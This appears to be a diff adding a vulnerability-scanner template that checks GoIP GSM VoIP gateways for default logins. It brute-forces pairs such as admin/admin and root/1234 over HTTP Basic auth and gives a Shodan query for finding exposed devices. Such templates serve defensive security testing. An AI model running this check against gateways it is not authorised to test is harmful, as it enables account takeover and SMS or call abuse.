@@ -1,0 +1,58 @@
+id: goip-default-login
+
+info:
+  name: GoIP GSM VoIP Gateway - Default Password
+  author: drfabiocastro
+  severity: high
+  description: |
+    GoIP GSM VoIP Gateway Default Password, Allows attackers to send, receive sms and calls.
+  reference:
+    - http://en.dbltek.com/
+    - https://medium.com/@hackatnow/how-to-create-a-python-script-to-find-goip-gsm-gateway-on-shodan-and-send-sms-ussd-via-goip-e2e203f5d339
+    - https://www.voip-systems.ru/assets/files/voip/voip-gsm/User_Manual_1_4_8_16.pdf
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    max-request: 12
+    shodan-query: 'HTTP/1.0 401 Please Authenticate\r\nWWW-Authenticate: Basic realm="Please Login"'
+  tags: default-login,goip,gsm
+
+http:
+  - raw:
+      - |
+        GET /default/en_US/status.html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - admin
+        - root
+        - sms
+        - user
+      password:
+        - admin
+        - root
+        - 1234
+    host-redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Status"
+          - "GoIP"
+          - "Summary"
+          - "Logout"
+        condition: and
+        case-insensitive: true
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a004730450221009cf451433dcf74fe1f8921e94e67b72b095733cc4ccb5f0be3a3cbf6eeedbee202207210e8bae1fb331bdaee14f25437c25516bd56ab47ff03b2bee78b8e7b97ce01:922c64590222798bb761d5b6d8e72950
